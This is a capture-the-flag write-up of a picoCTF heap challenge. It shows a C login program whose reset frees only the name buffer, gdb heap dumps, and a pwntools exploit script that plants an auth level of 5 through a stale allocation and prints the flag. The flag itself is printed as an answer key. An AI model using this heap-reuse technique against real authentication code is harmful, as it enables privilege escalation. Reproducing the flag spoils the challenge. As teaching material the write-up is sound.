# Problem
Can you get root access through this [service](https://2018shell1.picoctf.com/static/783793373b63bfc1c70197989d3c987a/auth) and get the flag? Connect with ```nc 2018shell1.picoctf.com 26847```. [Source](https://2018shell1.picoctf.com/static/783793373b63bfc1c70197989d3c987a/auth.c).

## Hints:
If only the program used calloc to zero out the memory..

## Solution:

Lets download the files and look at the source:
```bash
wget https://2018shell1.picoctf.com/static/783793373b63bfc1c70197989d3c987a/auth
wget https://2018shell1.picoctf.com/static/783793373b63bfc1c70197989d3c987a/auth.c
chmod +x ./auth
```

The source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

typedef enum auth_level {
  ANONYMOUS = 1,
  GUEST = 2,
  USER = 3,
  ADMIN = 4,
  ROOT = 5
} auth_level_t;
  
struct user {
  char *name;
  auth_level_t level;
};

void give_flag(){
  char flag[48];
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  if ((fgets(flag, 48, f)) == NULL){
    puts("Couldn't read flag file.");
    exit(1);
  };
  
  puts(flag);
  fclose(f);
}

void menu(){
  puts("Available commands:");
  puts("\tshow - show your current user and authorization level");
  puts("\tlogin [name] - log in as [name]");
  puts("\tset-auth [level] - set your authorization level (must be below 5)");
  puts("\tget-flag - print the flag (requires authorization level 5)");
  puts("\treset - log out and reset authorization level");
  puts("\tquit - exit the program");
}

int main(int argc, char **argv){
  char buf[512];
  char *arg;
  uint32_t level;
  struct user *user;

  setbuf(stdout, NULL);

  menu();

  user = NULL;
  while(1){
    puts("\nEnter your command:");
    putchar('>'); putchar(' ');

    if(fgets(buf, 512, stdin) == NULL)
      break;

    if (!strncmp(buf, "show", 4)){
      if(user == NULL){
  puts("Not logged in.");
      }else{
  printf("Logged in as %s [%u]\n", user->name, user->level);
      }

    }else if (!strncmp(buf, "login", 5)){
      if (user != NULL){
  puts("Already logged in. Reset first.");
  continue;
      }

      arg = strtok(&buf[6], "\n");
      if (arg == NULL){
  puts("Invalid command");
  continue;
      }

      user = (struct user *)malloc(sizeof(struct user));
      if (user == NULL) {
  puts("malloc() returned NULL. Out of Memory\n");
  exit(-1);
      }
      user->name = strdup(arg);
      printf("Logged in as \"%s\"\n", arg);

    }else if(!strncmp(buf, "set-auth", 8)){
      if(user == NULL){
  puts("Login first.");
  continue;
      }

      arg = strtok(&buf[9], "\n");
      if (arg == NULL){
  puts("Invalid command");
  continue;
      }

      level = strtoul(arg, NULL, 10);

      if (level >= 5){
  puts("Can only set authorization level below 5");
  continue;
      }

      user->level = level;
      printf("Set authorization level to \"%u\"\n", level);

    }else if(!strncmp(buf, "get-flag", 8)){
      if (user == NULL){
  puts("Login first!");
  continue;
      }

      if (user->level != 5){
  puts("Must have authorization level 5.");
  continue;
      }

      give_flag();
    }else if(!strncmp(buf, "reset", 5)){
      if (user == NULL){
  puts("Not logged in!");
  continue;
      }

      free(user->name);
      user = NULL;

      puts("Logged out!");
    }else if(!strncmp(buf, "quit", 4)){
      return 0;
    }else{
      puts("Invalid option");
      menu();
    }
  }
}
```

In this challenge we will start messing with the heap.

This program lets us do few things:
* show - shows our name and level.
* login <name> - if not logged in already, allocates new ```user``` and puts out name in it.
* set-auth <level> - if logged in, we can set our level (up to 4).
* get-flag - if logged in, and level is ```5```, prints the flag.
* reset - if logged in, free ```user->name``` and set pointer to ```null```.
* quit - I couldn't understand what this options do. too hard :(

The ```user``` struct is:
```c
struct user {
  char *name;
  auth_level_t level;
};
```

Lets debug the program and look at the heap before and after allocation.

Before the first "login":
```bash
gdb ./auth

gdb-peda$ b *0x0000000000400b4b
Breakpoint 1 at 0x400b4b
gdb-peda$ r
Starting program: /home/roee/CTFs-Writeups/picoCTF-2018/Binary/13-are_you_root-550/auth 
Available commands:
  show - show your current user and authorization level
  login [name] - log in as [name]
  set-auth [level] - set your authorization level (must be below 5)
  get-flag - print the flag (requires authorization level 5)
  reset - log out and reset authorization level
  quit - exit the program

Enter your command:
> show
gdb-peda$ x/1000wx 0x603000
0x603000: 0x00000000  0x00000000  0x00000251  0x00000000
0x603010: 0x00000000  0x00000000  0x00000000  0x00000000
0x603020: 0x00000000  0x00000000  0x00000000  0x00000000
0x603030: 0x00000000  0x00000000  0x00000000  0x00000000
0x603040: 0x00000000  0x00000000  0x00000000  0x00000000
0x603050: 0x00000000  0x00000000  0x00000000  0x00000000
0x603060: 0x00000000  0x00000000  0x00000000  0x00000000
0x603070: 0x00000000  0x00000000  0x00000000  0x00000000
0x603080: 0x00000000  0x00000000  0x00000000  0x00000000
0x603090: 0x00000000  0x00000000  0x00000000  0x00000000
0x6030a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6030b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6030c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6030d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6030e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6030f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x603100: 0x00000000  0x00000000  0x00000000  0x00000000
0x603110: 0x00000000  0x00000000  0x00000000  0x00000000
0x603120: 0x00000000  0x00000000  0x00000000  0x00000000
0x603130: 0x00000000  0x00000000  0x00000000  0x00000000
0x603140: 0x00000000  0x00000000  0x00000000  0x00000000
0x603150: 0x00000000  0x00000000  0x00000000  0x00000000
0x603160: 0x00000000  0x00000000  0x00000000  0x00000000
0x603170: 0x00000000  0x00000000  0x00000000  0x00000000
0x603180: 0x00000000  0x00000000  0x00000000  0x00000000
0x603190: 0x00000000  0x00000000  0x00000000  0x00000000
0x6031a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6031b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6031c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6031d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6031e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6031f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x603200: 0x00000000  0x00000000  0x00000000  0x00000000
0x603210: 0x00000000  0x00000000  0x00000000  0x00000000
0x603220: 0x00000000  0x00000000  0x00000000  0x00000000
0x603230: 0x00000000  0x00000000  0x00000000  0x00000000
0x603240: 0x00000000  0x00000000  0x00000000  0x00000000
0x603250: 0x00000000  0x00000000  0x00000411  0x00000000
0x603260: 0x776f6873  0x0000000a  0x00000000  0x00000000
0x603270: 0x00000000  0x00000000  0x00000000  0x00000000
0x603280: 0x00000000  0x00000000  0x00000000  0x00000000
0x603290: 0x00000000  0x00000000  0x00000000  0x00000000
0x6032a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6032b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6032c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6032d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6032e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6032f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x603300: 0x00000000  0x00000000  0x00000000  0x00000000
0x603310: 0x00000000  0x00000000  0x00000000  0x00000000
0x603320: 0x00000000  0x00000000  0x00000000  0x00000000
0x603330: 0x00000000  0x00000000  0x00000000  0x00000000
0x603340: 0x00000000  0x00000000  0x00000000  0x00000000
0x603350: 0x00000000  0x00000000  0x00000000  0x00000000
0x603360: 0x00000000  0x00000000  0x00000000  0x00000000
0x603370: 0x00000000  0x00000000  0x00000000  0x00000000
0x603380: 0x00000000  0x00000000  0x00000000  0x00000000
0x603390: 0x00000000  0x00000000  0x00000000  0x00000000
0x6033a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6033b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6033c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6033d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6033e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6033f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x603400: 0x00000000  0x00000000  0x00000000  0x00000000
0x603410: 0x00000000  0x00000000  0x00000000  0x00000000
0x603420: 0x00000000  0x00000000  0x00000000  0x00000000
0x603430: 0x00000000  0x00000000  0x00000000  0x00000000
0x603440: 0x00000000  0x00000000  0x00000000  0x00000000
0x603450: 0x00000000  0x00000000  0x00000000  0x00000000
0x603460: 0x00000000  0x00000000  0x00000000  0x00000000
0x603470: 0x00000000  0x00000000  0x00000000  0x00000000
0x603480: 0x00000000  0x00000000  0x00000000  0x00000000
0x603490: 0x00000000  0x00000000  0x00000000  0x00000000
0x6034a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6034b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6034c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6034d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6034e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6034f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x603500: 0x00000000  0x00000000  0x00000000  0x00000000
0x603510: 0x00000000  0x00000000  0x00000000  0x00000000
0x603520: 0x00000000  0x00000000  0x00000000  0x00000000
0x603530: 0x00000000  0x00000000  0x00000000  0x00000000
0x603540: 0x00000000  0x00000000  0x00000000  0x00000000
0x603550: 0x00000000  0x00000000  0x00000000  0x00000000
0x603560: 0x00000000  0x00000000  0x00000000  0x00000000
0x603570: 0x00000000  0x00000000  0x00000000  0x00000000
0x603580: 0x00000000  0x00000000  0x00000000  0x00000000
0x603590: 0x00000000  0x00000000  0x00000000  0x00000000
0x6035a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6035b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6035c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6035d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6035e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6035f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x603600: 0x00000000  0x00000000  0x00000000  0x00000000
0x603610: 0x00000000  0x00000000  0x00000000  0x00000000
0x603620: 0x00000000  0x00000000  0x00000000  0x00000000
0x603630: 0x00000000  0x00000000  0x00000000  0x00000000
0x603640: 0x00000000  0x00000000  0x00000000  0x00000000
0x603650: 0x00000000  0x00000000  0x00000000  0x00000000
0x603660: 0x00000000  0x00000000  0x000209a1  0x00000000
0x603670: 0x00000000  0x00000000  0x00000000  0x00000000
0x603680: 0x00000000  0x00000000  0x00000000  0x00000000
0x603690: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036b0: 0x00000000  0x00000000  0x00000000  0x00000000
...
0x603f90: 0x00000000  0x00000000  0x00000000  0x00000000
```

There are two allocations (no idea where did they come from),
and the next free chunk is at ```0x603660```.

Now lets login as ```a``` and take another look:

```bash
gdb-peda$ c
Continuing.
Not logged in.

Enter your command:
> login a

...
gdb-peda$ x/100wx 0x603650
0x603650: 0x00000000  0x00000000  0x00000000  0x00000000
0x603660: 0x00000000  0x00000000  0x00000021  0x00000000
0x603670: 0x00603690  0x00000000  0x00000000  0x00000000
0x603680: 0x00000000  0x00000000  0x00000021  0x00000000
0x603690: 0x00000061  0x00000000  0x00000000  0x00000000
0x6036a0: 0x00000000  0x00000000  0x00020961  0x00000000
0x6036b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x603700: 0x00000000  0x00000000  0x00000000  0x00000000
0x603710: 0x00000000  0x00000000  0x00000000  0x00000000
0x603720: 0x00000000  0x00000000  0x00000000  0x00000000
0x603730: 0x00000000  0x00000000  0x00000000  0x00000000
0x603740: 0x00000000  0x00000000  0x00000000  0x00000000
0x603750: 0x00000000  0x00000000  0x00000000  0x00000000
0x603760: 0x00000000  0x00000000  0x00000000  0x00000000
0x603770: 0x00000000  0x00000000  0x00000000  0x00000000
0x603780: 0x00000000  0x00000000  0x00000000  0x00000000
0x603790: 0x00000000  0x00000000  0x00000000  0x00000000
0x6037a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6037b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6037c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6037d0: 0x00000000  0x00000000  0x00000000  0x00000000
```

We can see two new allocations:
* 0x603660 - The ```user``` struct (user->name = 0x00603690, user->leve = 0x00000000)
* 0x603680 - For ```user->name``` (contains 0x00000061 = "a")

Now lets reset and login again as ```aaaaaaaaa```:

```bash
gdb-peda$ c
Continuing.
reset

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdb80 --> 0xa7465736572 ('reset\n')
RBX: 0x0 
RCX: 0xfbad2288 
RDX: 0x4 
RSI: 0x4010f5 --> 0x746f4e00776f6873 ('show')
RDI: 0x7fffffffdb80 --> 0xa7465736572 ('reset\n')
RBP: 0x7fffffffdd90 --> 0x400e70 (<__libc_csu_init>:  push   r15)
RSP: 0x7fffffffdb50 --> 0x7fffffffde78 --> 0x7fffffffe1c5 ("/home/roee/CTFs-Writeups/picoCTF-2018/Binary/13-are_you_root-550/auth")
RIP: 0x400b4b (<main+166>:  call   0x4007d0 <strncmp@plt>)
R8 : 0x603266 --> 0xa61 ('a\n')
R9 : 0x7ffff7fc14c0 (0x00007ffff7fc14c0)
R10: 0x7ffff7fc14c0 (0x00007ffff7fc14c0)
R11: 0x246 
R12: 0x4008c0 (<_start>:  xor    ebp,ebp)
R13: 0x7fffffffde70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400b3e <main+153>: mov    edx,0x4
   0x400b43 <main+158>: mov    esi,0x4010f5
   0x400b48 <main+163>: mov    rdi,rax
=> 0x400b4b <main+166>: call   0x4007d0 <strncmp@plt>
   0x400b50 <main+171>: test   eax,eax
   0x400b52 <main+173>: jne    0x400b95 <main+240>
   0x400b54 <main+175>: cmp    QWORD PTR [rbp-0x220],0x0
   0x400b5c <main+183>: jne    0x400b6a <main+197>
Guessed arguments:
arg[0]: 0x7fffffffdb80 --> 0xa7465736572 ('reset\n')
arg[1]: 0x4010f5 --> 0x746f4e00776f6873 ('show')
arg[2]: 0x4 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdb50 --> 0x7fffffffde78 --> 0x7fffffffe1c5 ("/home/roee/CTFs-Writeups/picoCTF-2018/Binary/13-are_you_root-550/auth")
0008| 0x7fffffffdb58 --> 0x1f79f8e48 
0016| 0x7fffffffdb60 --> 0x7fffffffdb94 --> 0x0 
0024| 0x7fffffffdb68 --> 0x7fffffffdc60 --> 0xffffffff 
0032| 0x7fffffffdb70 --> 0x603670 --> 0x603690 --> 0x61 ('a')
0040| 0x7fffffffdb78 --> 0x7fffffffdb86 --> 0x1958a000000 
0048| 0x7fffffffdb80 --> 0xa7465736572 ('reset\n')
0056| 0x7fffffffdb88 --> 0x1958a00 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400b4b in main ()
gdb-peda$ c
Continuing.
Logged out!

Enter your command:
> login aaaaaaaaa




[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdb80 ("login aaaaaaaaa\n")
RBX: 0x0 
RCX: 0xfbad2288 
RDX: 0x4 
RSI: 0x4010f5 --> 0x746f4e00776f6873 ('show')
RDI: 0x7fffffffdb80 ("login aaaaaaaaa\n")
RBP: 0x7fffffffdd90 --> 0x400e70 (<__libc_csu_init>:  push   r15)
RSP: 0x7fffffffdb50 --> 0x7fffffffde78 --> 0x7fffffffe1c5 ("/home/roee/CTFs-Writeups/picoCTF-2018/Binary/13-are_you_root-550/auth")
RIP: 0x400b4b (<main+166>:  call   0x4007d0 <strncmp@plt>)
R8 : 0x603270 --> 0x0 
R9 : 0x7ffff7fc14c0 (0x00007ffff7fc14c0)
R10: 0x7ffff7fc14c0 (0x00007ffff7fc14c0)
R11: 0x246 
R12: 0x4008c0 (<_start>:  xor    ebp,ebp)
R13: 0x7fffffffde70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400b3e <main+153>: mov    edx,0x4
   0x400b43 <main+158>: mov    esi,0x4010f5
   0x400b48 <main+163>: mov    rdi,rax
=> 0x400b4b <main+166>: call   0x4007d0 <strncmp@plt>
   0x400b50 <main+171>: test   eax,eax
   0x400b52 <main+173>: jne    0x400b95 <main+240>
   0x400b54 <main+175>: cmp    QWORD PTR [rbp-0x220],0x0
   0x400b5c <main+183>: jne    0x400b6a <main+197>
Guessed arguments:
arg[0]: 0x7fffffffdb80 ("login aaaaaaaaa\n")
arg[1]: 0x4010f5 --> 0x746f4e00776f6873 ('show')
arg[2]: 0x4 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdb50 --> 0x7fffffffde78 --> 0x7fffffffe1c5 ("/home/roee/CTFs-Writeups/picoCTF-2018/Binary/13-are_you_root-550/auth")
0008| 0x7fffffffdb58 --> 0x1f79f8e48 
0016| 0x7fffffffdb60 --> 0x7fffffffdb94 --> 0x0 
0024| 0x7fffffffdb68 --> 0x7fffffffdc60 --> 0xffffffff 
0032| 0x7fffffffdb70 --> 0x0 
0040| 0x7fffffffdb78 --> 0x7fffffffdb86 ("aaaaaaaaa\n")
0048| 0x7fffffffdb80 ("login aaaaaaaaa\n")
0056| 0x7fffffffdb88 ("aaaaaaa\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400b4b in main ()

...

gdb-peda$ x/100wx 0x603650
0x603650: 0x00000000  0x00000000  0x00000000  0x00000000
0x603660: 0x00000000  0x00000000  0x00000021  0x00000000
0x603670: 0x00603690  0x00000000  0x00000000  0x00000000
0x603680: 0x00000000  0x00000000  0x00000021  0x00000000
0x603690: 0x006036b0  0x00000000  0x00000000  0x00000000
0x6036a0: 0x00000000  0x00000000  0x00000021  0x00000000
0x6036b0: 0x61616161  0x61616161  0x00000061  0x00000000
0x6036c0: 0x00000000  0x00000000  0x00020941  0x00000000
0x6036d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x603700: 0x00000000  0x00000000  0x00000000  0x00000000
0x603710: 0x00000000  0x00000000  0x00000000  0x00000000
0x603720: 0x00000000  0x00000000  0x00000000  0x00000000
0x603730: 0x00000000  0x00000000  0x00000000  0x00000000
0x603740: 0x00000000  0x00000000  0x00000000  0x00000000
```

We can see that the ```user``` allocation was never freed. We allocated new memory chunk (in the same address of the freed ```user->name``` chunk) for ```user```, and new fresh chunk for ```user->name```.

When the ```name``` is longer than 8 bytes, it start writing the third dword, which means ```user->level``` in the context of ```user```. We can write there ```\x05```, then reset and login again and our auth-level will be 5. Thas nice!

Lets write some code:
```python
#!/usr/bin/env python

from pwn import *

debug = 0

if debug:
  p = process('./auth')
else:
  p = remote('2018shell1.picoctf.com', 26847)

print p.recvuntil('> ')

p.sendline('login {}'.format('a' * 8 + '\x05'))
p.sendline('reset')
p.sendline('login {}'.format('a'))
p.sendline('show')
p.sendline('get-flag')
p.sendline('quit')

print p.recvall()
```

The output:
```bash
[+] Opening connection to 2018shell1.picoctf.com on port 26847: Done
Available commands:
    show - show your current user and authorization level
    login [name] - log in as [name]
    set-auth [level] - set your authorization level (must be below 5)
    get-flag - print the flag (requires authorization level 5)
    reset - log out and reset authorization level
    quit - exit the program

Enter your command:
> 
[+] Receiving all data: Done (229B)
[*] Closed connection to 2018shell1.picoctf.com port 26847
Logged in as "aaaaaaaa\x05"

Enter your command:
> Logged out!

Enter your command:
> Logged in as "a"

Enter your command:
> Logged in as a [5]

Enter your command:
> picoCTF{m3sS1nG_w1tH_tH3_h43p_4baeffe9}


Enter your command:
> 
```

Flag: picoCTF{m3sS1nG_w1tH_tH3_h43p_4baeffe9}